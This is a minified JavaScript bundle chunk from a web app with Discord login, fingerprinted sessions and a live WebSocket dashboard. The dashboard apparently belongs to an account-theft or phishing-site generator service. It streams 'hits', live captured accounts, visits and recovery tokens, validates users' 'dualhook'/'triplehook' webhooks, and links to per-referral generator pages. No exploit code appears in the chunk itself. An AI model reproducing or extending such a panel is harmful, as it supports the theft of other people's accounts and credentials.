(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[7510],{2002:(e,t,n)=>{"use strict";n.d(t,{Provider:()=>v,X:()=>u});var r=n(95155),o=n(12115),a=n(95561),i=n(41403),s=n(84130),c=n(18720),l=n(56387);let h={StatsMode:"normal",ToggleMode:()=>void 0};class d{createSocket(){var e,t,n,r;let o=new WebSocket(this.buildUrl()),a={message:(null==(e=this.handlers)?void 0:e.onMessage)?e=>{var t,n;return null==(n=this.handlers)||null==(t=n.onMessage)?void 0:t.call(n,e,this)}:this.message.bind(this),close:(null==(t=this.handlers)?void 0:t.onClose)?e=>{var t,n;return null==(n=this.handlers)||null==(t=n.onClose)?void 0:t.call(n,e,this)}:this.close.bind(this),error:(null==(n=this.handlers)?void 0:n.onError)?e=>{var t,n;return null==(n=this.handlers)||null==(t=n.onError)?void 0:t.call(n,e,this)}:this.error.bind(this),open:(null==(r=this.handlers)?void 0:r.onOpen)?e=>{var t,n;return null==(n=this.handlers)||null==(t=n.onOpen)?void 0:t.call(n,e,this)}:this.open.bind(this)};for(let e in a){let t=a[e];o.addEventListener(e,t),this.listeners.push({type:e,handler:t})}return o}buildUrl(){if(Object.keys(this.query).length>0){let e=Object.entries(this.query).map(e=>"".concat(e[0],"=").concat(encodeURIComponent(e[1]))).join("&");return"wss://".concat(this.url,"?").concat(e)}return"wss://".concat(this.url)}message(e){this.log("Received event with data","info",e.data)}log(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"info",n=arguments.length>2?arguments[2]:void 0,r=new Date().toISOString(),o="background: #222; color: ".concat({info:"lightblue",success:"#bada55",error:"red",warn:"orange"}[t],"; padding: 2px 4px; border-radius: 2px;");void 0!==n?console.log("[".concat(r,"] [Socketer] %c").concat(e),o,n):console.log("[".concat(r,"] [Socketer] %c").concat(e),o)}reconnect(){if(clearInterval(this.intervalId),this.connectionEntries>=this.maxTries)return this.max(),this.log("connection dropped too many times","error");this.log("Reconnecting to the WebSocket"),this.connectionEntries++,this.removeListeners(),this.manualClose=!1,setTimeout(()=>this.Socket=this.createSocket(),250)}close(){let e=arguments.length>0&&void 0!==arguments[0]&&arguments[0];e instanceof CloseEvent?(this.log("Connection closed [".concat(e.code,"]: ").concat(e.reason||"Exception"),"warn"),this.manualClose||this.reconnect()):!0===e&&(clearInterval(this.intervalId),this.Socket.readyState===WebSocket.OPEN&&this.Socket.close(1e3,"socket closed manually"),this.manualClose=!0,this.removeListeners())}error(e){this.log("Error occured","error",e),this.reconnect()}open(){this.intervalId=this.interval(),this.connectionEntries=0,this.log("Connected sucessfully","success")}interval(){return setInterval(()=>this.Socket.readyState===WebSocket.OPEN&&this.Socket.send(JSON.stringify({type:"ping",ts:new Date().getTime()})),this.pingInterval||15e3)}max(){var e;return(null==(e=this.handlers)?void 0:e.max)?this.handlers.max(this):window.location.href="/auth"}removeListeners(){this.listeners.forEach(e=>{let{type:t,handler:n}=e;this.Socket.removeEventListener(t,n)}),this.listeners=[]}constructor({url:e,query:t,maxTries:n,handlers:r,pingInterval:o}){this.connectionEntries=0,this.listeners=[],this.manualClose=!1,this.url=e,this.query=t,this.maxTries=n,this.handlers=r,this.pingInterval=o,this.Socket=this.createSocket()}}let u=(0,o.createContext)(h);function v(e){let{children:t}=e,[n,v]=(0,o.useState)(!0),[g,w]=(0,o.useState)(h),f=(0,i.Ez)();if(!f)return window.location.href="/auth";let p=!1,m=async e=>{if(!p){p=!0;try{let t=await fetch(e.Main.Settings.webHook,{mode:"cors"});if(404===t.status&&c.oR.error("Your PRIMARY (normal) webhook is incorrect!"),e.Main.Partial){let t=e.Main.Settings.linkedRef?"dualhook":"triplehook",n=await fetch(e.Main.Partial.webHook,{mode:"cors"});404===n.status&&c.oR.error("Your PARTIAL (".concat(t,") webhook is incorrect!"))}}catch(e){}}};return(0,o.useEffect)(()=>{w(e=>({...e,setState:w}));let e=new d({url:(0,l.T6)("gateway",!1)+"/sockets/user",query:{__omit:JSON.stringify({"x-id":f.Auth.Id,"x-token":f.Auth.Token,"x-ref":f.Params.referral})},maxTries:3,pingInterval:6e3,handlers:{onMessage(e,t){if("pong"!==e.data&&e.data)try{let n=JSON.parse(e.data);switch(n.type){case"omni":let r=a.ny.User.parse(n);!p&&r.omniData&&m(r.omniData),w(e=>({...e,Data:r})),v(!1);break;case"accounts":w(e=>({...e,Accounts:a.ny.Hits.parse(n)}));break;case"leaderboards":w(e=>({...e,Board:a.ny.Boards.parse(n)}));break;case"live_accounts":w(e=>({...e,LiveAccounts:a.ny.LiveAccounts.parse(n.omniData)}));break;case"live_visits":w(e=>({...e,LiveVisits:a.ny.LiveVisits.parse(n.omniData)}));break;case"push_account":w(e=>({...e,PushAccount:a.ny.PushAccount.parse(n.omniData)}));break;case"partial_users":w(e=>({...e,PartialUsers:a.ny.PartialUsers.parse(n.omniData)}));break;case"recovery_token":w(e=>({...e,RecoveryToken:a.ny.RecoveryToken.parse(n)}));break;case"pong":return n;default:return t.log("Unrecognized Type: ".concat(n.type),"error"),null}}catch(e){return t.log(e,"error")}},max:()=>window.location.href=(null==f?void 0:f.Params.referral)?"/generator/".concat(null==f?void 0:f.Params.referral,"/auth"):"/auth"}});return()=>{e.Socket.readyState===WebSocket.OPEN&&e.close(!0)}},[f.Auth.Id]),n?(0,r.jsx)(s.default,{wrapperClass:"flex items-center justify-center align-center h-screen w-screen"}):(0,r.jsx)(u.Provider,{value:{...g,ToggleMode:()=>{w(e=>{var t,n;return{...e,StatsMode:"normal"===e.StatsMode&&(null==(n=e.Data)||null==(t=n.omniData)?void 0:t.Main.Partial)?"partial":"normal"}})}},children:t})}},21731:(e,t,n)=>{"use strict";n.d(t,{CI:()=>l,Jv:()=>c,Sj:()=>s});var r=n(95561),o=n(54879),a=n(56387),i=n(15376).Buffer;let s=o.g1(o.bz()).and(o.Ik({User:r.ny.Apis.Discord.User,Auth:o.re({Id:o.ai(),Token:o.Yj()}),Params:o.Ik({referral:o.Yj().optional()}).catchall(o.Yj()),inView:o.zM().optional()}));function c(e){let{callbackURL:t,additionalParams:n,redirectURL:r}=e;if(!window||!window.location)throw Error("Window is not initialized");let o="https://discord.com/api/oauth2/authorize?client_id=".concat(a.Ay.discord.oauth_id,"&redirect_uri=").concat(t,"&response_type=code&scope=identify&prompt=none"),s={__LOCAL_PASSED:{__INITIAL_URL:window.location.href,__REDIRECT_URL:r,__CALLBACK_URL:t,__SWAP_HOST:window.location.host}},c=i.from(JSON.stringify(n?{...n,...s}:s)).toString("base64");o+="&state=".concat(c),window.location.href=o}async function l(e){return await fetch("/api/signout",{method:"POST",mode:"cors"}),e&&(window.location.href=e.href),!0}},35907:(e,t,n)=>{"use strict";n.d(t,{Provider:()=>s,o:()=>i});var r=n(95155),o=n(12115),a=n(41403);let i=o.createContext(null);function s(e){let{session:t,children:n}=e,o=(0,a.wV)("/api/session",t);return(0,r.jsx)(i.Provider,{value:o,children:n})}},41403:(e,t,n)=>{"use strict";n.d(t,{Ht:()=>h,Ez:()=>l,wV:()=>c});var r=n(12115),o=n(21731),a=n(60316),i=n.n(a),s=n(35907);function c(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"/api/session",t=arguments.length>1?arguments[1]:void 0,[n,a]=r.useState(t||null),s=r.useCallback(async function(t){let n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:3,r=0,s=!1;for(;r<n&&!s;)try{let n=await fetch(new URL(e,t),{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({cubizHash:function(){let e=JSON.stringify({timePassed:Date.now(),historyLength:window.history.length,userAgent:navigator.userAgent,screenWidth:window.screen.width,screenHeight:window.screen.height,language:navigator.language,timezoneOffset:new Date().getTimezoneOffset(),rand:i().lib.WordArray.random(16).toString(),colorDepth:window.screen.colorDepth,hardwareConcurrency:navigator.hardwareConcurrency||"unknown",maxTouchPoints:navigator.maxTouchPoints||"unknown"}),t=i().HmacSHA256(e,i().enc.Base64.parse(navigator.userAgent).toString()).toString(),n=Date.now(),r=i().lib.WordArray.random(16).toString(),o="".concat(t,".").concat(n,".").concat(r),a=i().lib.WordArray.random(32).toString(),s=i().lib.WordArray.random(16).toString();return i().AES.encrypt(o,i().enc.Hex.parse(a),{iv:i().enc.Hex.parse(s)}).toString()}()})});if(200===n.status||403===n.status)a(o.Sj.parse(await n.json())),s=!0;else throw Error("Unexpected status: ".concat(n.status))}catch(e){(r+=1)>=n&&a(null)}},[e]);return r.useEffect(()=>{t||s(window.location.href);let e=setInterval(()=>{if(null==n?void 0:n.inView)return clearInterval(e);s(window.location.href)},1e4);return()=>clearInterval(e)},[s,t,null==n?void 0:n.Auth.Id,null==n?void 0:n.inView]),{Session:n,setSession:a}}function l(){var e;return null==(e=r.useContext(s.o))?void 0:e.Session}let h=l},50477:()=>{}}]);